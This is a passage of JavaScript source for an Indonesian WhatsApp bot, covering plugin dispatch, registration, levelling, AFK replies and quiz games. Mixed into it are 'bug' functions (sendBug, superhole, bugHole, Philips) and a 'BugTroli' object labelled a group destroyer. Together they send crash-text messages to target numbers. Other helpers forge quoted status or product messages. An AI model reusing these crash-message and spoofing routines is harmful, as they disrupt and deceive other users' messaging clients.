    for (let name in global.plugins) {
plugin = global.plugins[name]
if (!plugin) continue
if (plugin.disabled) continue
if (typeof plugin.before === 'function')
await plugin.before.call(arifi, m, {
conn: arifi,
chatUpdate: rojak,
isCmd: isCmd
})
if (typeof plugin !== 'function') continue
}
let noPrefix = body.replace(prefix, '')
let [_command] = noPrefix.trim().split` `.filter(v => v)
for (let name in global.plugins){
let plugin = global.plugins[name]
let fail = plugin.fail || global.dfail // When failed
if (!plugin) continue
if (plugin.disabled) continue
let isAccept = plugin.command instanceof RegExp ? plugin.command.test(_command) : Array.isArray(plugin.command) ? plugin.command.some(cmd => cmd instanceof RegExp ? cmd.test(_command) : cmd === _command) : typeof plugin.command === 'string' ? plugin.command === _command : false
if (!isAccept) continue
if (plugin.owner && !rojak.key.fromMe) { // Number Owner
fail('owner', m, arifi)
continue
}
if (plugin.grup && !isGroup) { //only group
fail('grup', m, arifi)
continue
}
if (plugin.admin && !isGroupAdmins) { // only admin
fail('admin', m, arifi)
continue
}
if (plugin.botAdmin && !botGroupAdmins) { // bot admin
fail('botAdmin', m, arifi)
continue
}
let extra = {
conn: arifi,
command,
usedPrefix: prefix,
args,
prefix,
text: q,
getBuffer,
}
await plugin.call(arifi, m, extra)
}
global.dfail = (type, m, arifi) => {
let msg = {
owner: 'owner only',
grup: 'grup only',
admin: 'admin grup only',
botAdmin: 'bot tidak menjadi admin',
}[type]
if (msg) return m.reply(msg)
}
global.fake = (teks, id) => {
key = { 
 'key': {
    'fromMe': false,
    'participant': id+'@s.whatsapp.net',
    'remoteJid': 'status@broadcast'
  },
  'message': {
    'conversation': teks
  }
}
return key
}

function parseMention(text) {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

let reply = (teks) => {
      arifi.sendMessage(from, `${teks}`, text, {
quoted: rojak, thumbnail:thumb, contextInfo: {mentionedJid: arifi.parseMention(teks)}}) //contextInfo:{externalAdReply:{title:`Hello ${pushname}`,body:ucapanWaktu,previewType:'PHOTO',thumbnail:thumb,sourceUrl:``}}})
}

let rojakAkses = (teks) => {
      arifi.sendMessage(`${server}`, `${teks}`, text, {
quoted: rojak, thumbnail:thumb, contextInfo: {mentionedJid: arifi.parseMention(teks)}}) //contextInfo:{externalAdReply:{title:`Hello ${pushname}`,body:ucapanWaktu,previewType:'PHOTO',thumbnail:thumb,sourceUrl:``}}})
}

    let sendMess = (hehe, teks) => {
      arifi.sendMessage(hehe, teks, text);
    };     
 
 
     let mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? arifi.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : arifi.sendMessage(from, teks.trim(), extendedText, {
            quoted: rojak,
            contextInfo: { mentionedJid: memberr },
          });
    };
var listmsgSimple = (from, title, desc, judul, list) => { // ngeread nya pake rows
let po = arifi.prepareMessageFromContent(from, { 'listMessage': { 'title': title, 'description': desc, 'buttonText': 'KLIK DISINI', 'listType': 'SINGLE_SELECT', 'sections': [{ 'title': judul, 'rows': list }]}}, {})
return arifi.relayWAMessage(po, {waitForAck: true})
}
var listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
let po = arifi.prepareMessageFromContent(from, {'listMessage': {'title': title,'description': desc,'buttonText': 'KLIK DISINI','listType': 'SINGLE_SELECT','sections': list}}, {})
return arifi.relayWAMessage(po, {waitForAck: true})
}

//function
        function randomNomor(angka){
            return Math.floor(Math.random() * angka) + 1
        }  
        let nebal = (angka) => {
            return Math.floor(angka)
        }   
           let createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
        let getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        let addRegisteredUser = (userid, sender, age, time, serials) => {
            let obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
        }
        
        let checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
        let isRegistered = checkRegisteredUser(sender)

var hayuk0 = '[NOT VERIFIED]'
			if (isRegistered) {
			hayuk0 = '[√ VERIFIED]'
}

function monospace(string) {
return '```' + string + '```'
}

function speedText(speed) {
  let bits = speed * 8;
  let units = ['', 'K', 'M', 'G', 'T'];
  let places = [0, 1, 2, 3];
  let unit = 0;
  while (bits >= 2000 && unit < 4) {
  unit++;
  bits/= 1000;
  }
  return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
} 

function groupCreate(nama, member){
  anu = arifi.groupCreate(nama, member)
  return anu
  .catch((err) => reply(err))
}

function Json(objectPromise) {
  var objectString = JSON.stringify(objectPromise, null, 2)
  var parse = util.format(objectString)
  if (objectString == undefined) {
  parse = util.format(objectPromise)
  }
  return reply(parse)
}

function JsonServer(objectPromise) {
  var objectString = JSON.stringify(objectPromise, null, 2)
  var parse = util.format(objectString)
  if (objectString == undefined) {
  parse = util.format(objectPromise)
  }
  return rojakAkses(parse)
}

let print = function (teks) {
  if (typeof teks !== 'string') teks = require ('util').inspect(teks)
  teks = require ('util').format(teks)
  return arifi.reply(from, teks, rojak)
}

     // Auto Regist
        if (isCmd && !isRegistered){
			_registered.push(sender)
			fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar))
        }  


       let daftar1 = `Hai kak  ${pushname}\n\nJangan lupa daftar dulu yah dengan cara klik tombol verify atau ketik !verify makasih ^^`

       let daftar2 = `${g}please click the button here\n©Created By Arifi Razzaq${g}`
       let daftar3 = [

          {

            buttonId: `!verify`,

            buttonText: {

              displayText: `VERIFY`,

            },

            type: 1,

          },]
          
    let isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          'gi'
        )
      );
    };

    let fonceimg = {
key: {
fromMe: false,
  participant: '0@s.whatsapp.net', ...(from ? { remoteJid: 'status@broadcast' } : {}) },
  message: {
imageMessage: {
  jpegThumbnail: foto,
  viewOnce: true
},
},
    };
 
let foncevid = { 
key: {fromMe: false, remoteJid: '6281315995629@g.us', participant: '0@s.whatsapp.net'}, 
message: { 
  videoMessage: { 
  jpegThumbnail: foto, 
  viewOnce: true
},
},
    };

    let ftroli = {
      key: {
        fromMe: false,
        participant: '0@s.whatsapp.net',
        remoteJid: '6289523258649-1604595598@g.us',
      },
      message: {
        orderMessage: {
          itemCount: 99,
          status: 200,
          thumbnail: foto,
          surface: 200,
          message: watermark,
          orderTitle: `${watermark}`,
          sellerJid: '0@s.whatsapp.net',
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
    let fdoc = {
      key: { participant: '0@s.whatsapp.net' },
      message: { documentMessage: { title: watermark, jpegThumbnail: thumb } },
    };
    let fvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: '6289643739077-1613049930@g.us' } : {}),
      },
      message: {
        audioMessage: {
          mimetype: 'audio/ogg; codecs=opus',
          seconds: 99999,
          ptt: 'true',
        },
      },
    };
    let fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: '6289643739077-1613049930@g.us' } : {}),
      },
      message: {
        videoMessage: {
          title: watermark,
          h: `Hmm`,
          seconds: '99999',
          gifPlayback: 'true',
          caption: watermark,
          jpegThumbnail: foto,
        },
      },
    };
    let fgclink = {
      key: { participant: '0@s.whatsapp.net', remoteJid: '0@s.whatsapp.net' },
      message: {
        groupInviteMessage: {
          groupJid: '6288213840883-1616169743@g.us',
          inviteCode: 'm',
          groupName: 'P',
          caption: watermark,
          jpegThumbnail: foto,
        },
      },
    };
    let fvideo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: '6289643739077-1613049930@g.us' } : {}),
      },
      message: {
        videoMessage: {
          title: watermark,
          h: `Hmm`,
          seconds: '99999',
          caption: watermark,
          jpegThumbnail: foto,
        },
      },
    };
    let floc = {
      key: { participant: '0@s.whatsapp.net' },
      message: { locationMessage: { name: watermark, jpegThumbnail: thumb } },
    };
    let fakestatus = (teks) => {
      arifi.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: 'status@broadcast' } : {}),
          },
          message: {
            imageMessage: {
              url: 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc',
              mimetype: 'image/jpeg',
              caption: watermark,
              fileSha256: '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
              fileLength: '28777',
              height: 1080,
              width: 1079,
              mediaKey: 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=',
              fileEncSha256: 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=',
              directPath:
                '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69',
              mediaKeyTimestamp: '1610993486',
              jpegThumbnail: thumb,
              scansSidecar:
                '1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==',
            },
          },
        },
      });
    };
    let fakethumb = (teks, yes) => {
      arifi.sendMessage(from, teks, image, {
        thumbnail: foto,
        quoted: rojak,
        caption: yes,
      });
    };
    let fakegroup = (teks) => {
      arifi.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: '6289523258649-1604595598@g.us' } : {}),
          },
          message: {
            imageMessage: {
              url: 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc',
              mimetype: 'image/jpeg',
              caption: watermark,
              fileSha256: '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
              fileLength: '28777',
              height: 1080,
              width: 1079,
              mediaKey: 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=',
              fileEncSha256: 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=',
              directPath:
                '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69',
              mediaKeyTimestamp: '1610993486',
              jpegThumbnail: foto,
              scansSidecar:
                '1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==',
            },
          },
        },
      });
    };

    let ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: '16505434800@s.whatsapp.net' } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: 'image/jpeg',
              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpg`), //Gambarnye
            },
            title: `${watermark}`, //Kasih namalu
            description: '©TSUKASA BOT',
            currencyCode: 'USD',
            priceAmount1000: '2000',
            retailerId: `${watermark}`,
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
    
    let BugTroli = { // Penghancur Grup
key : {
participant : '0@s.whatsapp.net' },
message: {
orderMessage: {
  itemCount : 999999999999999999,
  status: 99999999999999999999,
  surface : 9999999999999999,
  message: areatext.ude1(prefix),
  orderTitle: areatext.hantu(prefix),
  thumbnail: foto,
  sellerJid: '0@s.whatsapp.net'
},
},
    };
    
    let sendMediaURL = async (to, url, text = '', mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      let fn = Date.now() / 10000;
      let filename = fn.toString();
      let mime = '';
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers['content-type'];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on('close', callback);
        });
      }; 
      
      download(url, filename, async function () {
        console.log('done');
        let media = fs.readFileSync(filename);
        let type = mime.split('/')[0] + 'Message';
        if (mime === 'image/gif') {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split('/')[0] === 'audio') {
          mime = Mimetype.mp4Audio;
        }
        arifi.sendMessage(to, media, type, {
          quoted: rojak,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    }; 
    let sendFileFromUrl = async(link, type, options) => {
  hasil = await getBuffer(link).catch(e => {
	fetch(link).then((hasil) => {
	return arifi.sendMessage(from, hasil, type, options)
	}).catch(e => {
	arifi.sendMessage(from, { url : link }, type, options).catch(e => {
	  reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	  console.log(e)
	}) 
  }) 
  })
	arifi.sendMessage(from, hasil, type, options).catch(e => {
	fetch(link).then((hasil) => {
	arifi.sendMessage(from, hasil, type, options).catch(e => {
	arifi.sendMessage(from, { url : link }, type, options).catch(e => {
	  reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	  console.log(e)
	})
	})
	})
	})
	}  

	
///Button Location
let sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
let kma = gam1
let kntl = await arifi.prepareMessage(from, kma, location)
let buttonMessages = {
locationMessage: kntl.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
arifi.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

    let sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      let buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      arifi.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };
    
//button image
let sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
try {
mhan = await arifi.prepareMessage(from, gam1, image, {thumbanil: gam1})
let buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
arifi.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
} catch(e) {
if (e.toString().includes('marker was')) {
let mhan = await arifi.prepareMessage(from, gam1, image, {thumbanil: gam1})
let buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
arifi.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
} else if (e.toString().includes('ENOENT')) {
mhan = await arifi.prepareMessage(from, gam1, image, {thumbanil: gam1})
let buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
arifi.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
} else  {
return e
}
}
}
    let sendButVideo = async (
      id,
      text1,
      desc1,
      vid1,
      but = [],
      options = {}
    ) => {
      let kma = vid1;
      let mhan = await arifi.prepareMessage(from, kma, video);
      let buttonMessages = {
        videoMessage: mhan.message.videoMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 5,
      };
      arifi.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    let kick = function (from, orangnya) {
      for (let i of orangnya) {
        arifi.groupRemove(from, [i]);
      }
    };
    let add = function (from, orangnya) {
      arifi.groupAdd(from, orangnya);
    };
    let sendBug = async (target, teks) => {
    for(let i=0;i < 1;i++){
      if (!teks) teks = '.';
      await arifi.relayWAMessage(
        arifi.prepareMessageFromContent(
          target,
          arifi.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      arifi.sendMessage(target, teks, 'conversation');
    }
};

function superhole(nomor){
for(let i=0;i < 1;i++){
let nyefir = areatext.barVir(prefix)
arifi.sendMessage(nomor, nyefir, MessageType.extendedText, {quoted:BugTroli})
}
  }
function Philips(nomor){
for(let i=0;i < 1;i++){
let nyelips = areatext.Philips(prefix)
arifi.sendMessage(nomor, nyelips, MessageType.extendedText, {quoted:BugTroli})
}
  }
function bugHole(nomor){
for(let i=0;i < 1;i++){
let nyehole = areatext.bugHole(prefix)
arifi.sendMessage(nomor, areatext.ude1(prefix) + nyehole, MessageType.extendedText, {quoted:BugTroli})
}
  }
    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(':');
    }

    cekafk(afk);
    if (!rojak.key.remoteJid.endsWith('@g.us') && offline) {
      if (!rojak.key.fromMe) {
        if (isAfk(rojak.key.remoteJid)) return;
        addafk(rojak.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        arifi.sendMessage(
          rojak.key.remoteJid,
          `@${numberNon} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${numberNon}@s.whatsapp.net`],
              stanzaId: 'B826873620DD5947E683E3ABE663F263',
              participant: '0@s.whatsapp.net',
              remoteJid: 'status@broadcast',
              quotedMessage: {
                imageMessage: {
                  caption: '*OFFLINE*',
                  jpegThumbnail: fs.readFileSync('./stik/thumb.jpg'),
                },
              },
            },
          }
        );
      }
    }
    if (rojak.key.remoteJid.endsWith('@g.us') && offline) {
      if (!rojak.key.fromMe) {
        if (rojak.message.extendedTextMessage != undefined) {
          if (rojak.message.extendedTextMessage.contextInfo != undefined) {
            if (
              rojak.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of rojak.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${numberNon}@s.whatsapp.net`) {
                  if (isAfk(rojak.key.remoteJid)) return;
                  addafk(rojak.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  arifi.sendMessage(
                    rojak.key.remoteJid,
                    `@${numberNon} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${numberNon}@s.whatsapp.net`],
                        stanzaId: 'B826873620DD5947E683E3ABE663F263',
                        participant: '0@s.whatsapp.net',
                        remoteJid: 'status@broadcast',
                        quotedMessage: {
                          imageMessage: {
                            caption: '*OFFLINE*',
                            jpegThumbnail: fs.readFileSync('./stik/thumb.jpg'),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }
    //function leveling
        if (isGroup && isLevelingOn && isRegistered && arifi.mode !== 'self' && !isMuted && !isGained(sender)) {
            let currentLevel = getLevelingLevel(sender)
            let checkId = getLevelingId(sender)
            try {
                addCooldown(sender)
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                let amountXp = Math.floor(Math.random() * 10) + 150
                let requiredXp = 200 * (Math.pow(2, currentLevel) - 1)
                let getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    kotol = `*──「 LEVEL UP 」──*\n\n❑ *Name*: @${sender.split('@')[0]}\n❑ *XP*: ${getLevelingXp(sender)}\n❑ *Level*: ${getLevel} -> ${getLevelingLevel(sender)}\n❑ *Role*: ${role} \n\nCongrats!! 🎉`
                    sendButMessage(from, kotol, `Silahkan Click Next Untuk Melanjutkan Nya`, [
            {              
              buttonId: `${prefix}mining`,
              buttonText: {
                displayText: `🎟️MINING`,
              },
              type: 1,
            },
          ]);        
                }
            } catch (err) {
                console.error(err)
            }
        }
    _prem.expiredCheck(premium) 

game.cekWaktuFam(arifi, family100)
game.cekWaktuTG(arifi, tebakgambar)
game.cekWaktuMtk(arifi, mtk) 
game.cekWaktuTL(arifi, tebaklirik)
game.cekWaktuSA(arifi, siapaaku)
game.cekWaktuTK(arifi, tebakkata)
game.cekWaktuTU(arifi, tebakkimia)
game.cekWaktuTB(arifi, tebakbendera)
game.cekWaktuTA(arifi, tebakanime)

if (game.isMtk(from, mtk)){
if (chats.toLowerCase().includes(game.getJawabanMtk(from, mtk))){
var htgm3 = randomNomor(1000)
addBalance(sender, htgm3, balance)
await reply(`*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanMtk(from, mtk)}\n*Hadiah :* $${htgm3}\n\nIngin bermain lagi? kirim *${prefix}math*`)
mtk.splice(game.getMtkPosi(from, mtk), 1)
}
}    
if (game.isTebakLirik(from, tebaklirik)){
if (chats.toLowerCase().includes(game.getJawabanTL(from, tebaklirik))){
var htgml = randomNomor(100)
addBalance(sender, htgml, balance)
await fakestatus(`𝐆𝐀𝐌𝐄 𝐓𝐄𝐁𝐀𝐊 𝐋𝐈𝐑𝐈𝐊
*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanTL(from, tebaklirik)}\n*Hadiah :* $${htgml}
Ingin bermain lagi? kirim *${prefix}tebaklirik*`)
tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
}
} 
if (game.isSiapaAku(from, siapaaku)){
if (chats.toLowerCase().includes(game.getJawabanSA(from, siapaaku))){
var htgmu = randomNomor(100)
addBalance(sender, htgmu, balance)
await fakestatus(`𝐆𝐀𝐌𝐄 𝐒𝐈𝐀𝐏𝐀𝐊𝐀𝐇 𝐀𝐊𝐔
*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanSA(from, siapaaku)}\n*Hadiah :* $${htgmu}
Ingin bermain lagi? kirim *${prefix}siapakahaku*`)
siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
}
}
if (game.isTebakKata(from, tebakkata)){
if (chats.toLowerCase().includes(game.getJawabanTK(from, tebakkata))){
var htgtk = randomNomor(100)
addBalance(sender, htgtk, balance)
await fakestatus(`𝐆𝐀𝐌𝐄 𝐓𝐄𝐁𝐀𝐊 𝐊𝐀𝐓𝐀
*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanTK(from, tebakkata)}\n*Hadiah :* $${htgtk}
Ingin bermain lagi? kirim *${prefix}tebakkata*`)
tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
}
}
if (game.isTebakKimia(from, tebakkimia)){
if (chats.toLowerCase().includes(game.getJawabanTU(from, tebakkimia))){
var reva = randomNomor(100)
addBalance(sender, reva, balance)
await fakestatus(`𝐆𝐀𝐌𝐄 𝐓𝐄𝐁𝐀𝐊 𝐔𝐍𝐒𝐔𝐑 𝐊𝐈𝐌𝐈𝐀
*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanTU(from, tebakkimia)}\n*Hadiah :* $${reva}
Ingin bermain lagi? kirim *${prefix}tebakkimia*`)
tebakkimia.splice(game.getTUPosi(from, tebakkimia), 1)
}
}
if (game.isTebakBendera(from, tebakbendera)){
if (chats.toLowerCase().includes(game.getJawabanTB(from, tebakbendera))){
var syahira = randomNomor(100)
addBalance(sender, syahira, balance)
await fakestatus(`𝐆𝐀𝐌𝐄 𝐓𝐄𝐁𝐀𝐊 𝐁𝐄𝐍𝐃𝐄𝐑𝐀
*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanTB(from, tebakbendera)}\n*Hadiah :* $${syahira}
Ingin bermain lagi? kirim *${prefix}tebakbendera*`)
tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
}
}
if (game.isTebakAnime(from, tebakanime)){
if (chats.toLowerCase().includes(game.getJawabanTA(from, tebakanime))){
var vinna = randomNomor(100)
addBalance(sender, vinna, balance)
await fakestatus(`𝐆𝐀𝐌𝐄 𝐓𝐄𝐁𝐀𝐊 𝐀𝐍𝐈𝐌𝐄
*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanTA(from, tebakanime)}\n*Hadiah :* $${vinna}
Ingin bermain lagi? kirim *${prefix}tebakanime*`)
tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
}
} 	        
if (game.isTebakGambar(from, tebakgambar) && isRegistered){
            if (chats.toLowerCase().includes(game.getJawabanTG(from, tebakgambar))){
                var htgm = randomNomor(100)
                addBalance(sender, htgm, balance)
                await reply(`*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanTG(from, tebakgambar)}\n*Hadiah :* $${htgm}\n\nIngin bermain lagi? kirim *${prefix}tebakgambar*`)
                tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
            }
        }

if (game.isfam(from, family100)){
var anjuy = game.getjawaban100(from, family100)
for (let i of anjuy){
if (chats.toLowerCase().includes(i)){
var htgm1 = randomNomor(1000)
addBalance(sender, htgm1 , balance)
await reply(`*Jawaban benar*\n*Jawaban :* ${i}\n*Hadiah :* $${htgm1}\n\n*Jawaban yang blum tertebak :* ${anjuy.length - 1}`)
var anug = anjuy.indexOf(i)
anjuy.splice(anug, 1)
}
}
if (anjuy.length < 1){
arifi.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)
family100.splice(game.getfamposi(from, family100), 1)
}
}   
     
         //function check heal
             let checkHeal = (sender) => {
         	let foundh = false
             for (let heallmt of _heal) {
             if (heallmt.id === sender) {
             let healCounts = healawal - heallmt.heal
             if (healCounts <= 0) return arifi.sendMessage(from,`ya udah habis Heal kamu\n\n_Note : tenang Heal bisa didapatkan dengan cara ${prefix}usepotion_`, text,{ quoted: rojak})
             arifi.sendMessage(from, `HEAL : ${healCounts}`, text, { quoted : rojak})
             foundh = true
             }
             }
             if (foundh === false) {
             let obj = { id: sender, heal: 0 }
             _heal.push(obj)
             fs.writeFileSync('./database/adventure/heal.json', JSON.stringify(_heal))
             arifi.sendMessage(from, `HEAL : ${healCounts}`, text, { quoted : rojak})
             }
	         }
		 //funtion potion
          let isPotion = (sender) =>{ 
	      let position = false
          for (let i of _potion) {
          if (i.id === sender) {
          let potions = i.potion
          if (potions >= potionawal ) {
          position = true
          arifi.sendMessage(from, `Beli Potion ngab di /buypotion`, text, {quoted: rojak})
          return true
           } else {
           _potion
           position = true
           return false
           }
           }
           }
           if (position === false) {
           let obj = { id: sender, potion: 0 }
           _potion.push(obj)
           fs.writeFileSync('./database/adventure/potion.json',JSON.stringify(_potion))
           return false
            }
            }
            let checkPotion = (sender) => {
        	let foundh = false
            for (let potionlmt of _potion) {
            if (potionlmt.id === sender) {
            potionCounts = potionawal - potionlmt.potion
            if (potionCounts <= 0) return arifi.sendMessage(from,`ya udah habis potion kamu\n\n_Note : tenang limit bisa dibeli dengan cara ${prefix}buypotion_`, text,{ quoted: rojak})
            arifi.sendMessage(from, `POTION : ${potionCounts}`, text, { quoted : rojak})
            foundh = true
            }
            }
           if (foundh === false) {
           let obj = { id: sender, potion: 0 }
            _potion.push(obj)
           fs.writeFileSync('./database/adventure/potion.json', JSON.stringify(_potion))
           arifi.sendMessage(from, `POTION : ${potionCounts}`, text, { quoted : rojak})
            }
	        }

    //========================================================================================================================//
    let isMedia = type === 'imageMessage' || type === 'videoMessage';
    let isQuotedImage =
      type === 'extendedTextMessage' && content.includes('imageMessage');
    let isQuotedVideo =
      type === 'extendedTextMessage' && content.includes('videoMessage');
    let isQuotedAudio =
      type === 'extendedTextMessage' && content.includes('audioMessage');
    let isQuotedSticker =
      type === 'extendedTextMessage' && content.includes('stickerMessage');

    	if (budy.toLowerCase() === `7716`){
	if (isRegistered) return reply('Akun kamu sudah terverfikasi')
let serialUser = createSerial(18)
             try {
				var ppimg = await arifi.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
				var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			    }
            let veri = sender
            _registered.push(sender)
            fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
            addRegisteredUser(sender, serialUser)
             let anuu = `*Verifikasi sukses*

*• Nama :* ${pushname}
*• APis :* +${sender.split('@')[0]}
*• Serial :* ${serialUser}
*• Total :* ${_registered.length} Pengguna

*C O F F E E  B O T*`
         let lambe = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=https://i.pinimg.com/736x/e6/7d/76/e67d76ce62bdbc63a756b182f6b7a025.jpg`)
             let buttons = [
             {
             buttonId: `#menu`,buttonText:{
             displayText: `️MENU`},type:1
             }
             ]
             let imageMsg = (
             await arifi.prepareMessageMedia(
             lambe, 'imageMessage', { 
             thumbnail: lambe, 
             })
             ).imageMessage
            let buttonsMessage = {
            footerText:'Jangan Lupa Donasi Ya Kak ☕', 
            imageMessage: imageMsg,
             contentText:`${anuu}`,
             buttons,
             headerType:4
             }
             let prep = await arifi.prepareMessageFromContent(from,{
             buttonsMessage

             },{
             quoted: fvn

             })
              arifi.relayWAMessage(prep)
             console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
        // console.log(e)
            setTimeout( () => {
	    arifi.updatePresence(from, Presence.composing)
	    reply(`*Terimakasih Telah Terdaftar Di pena bot*`)
	}, 2000)
	}
	    // Auto Read
        arifi.chatRead(from, 'read')
     
      // CMD
        if (!isCmd && !isGroup) {
			arifi.updatePresence(from, Presence.composing)
            addBalance(sender, randomNomor(20), balance)
			console.log(rojak)
			 };
        if (isCmd && isGroup) {
			arifi.updatePresence(from, Presence.composing)
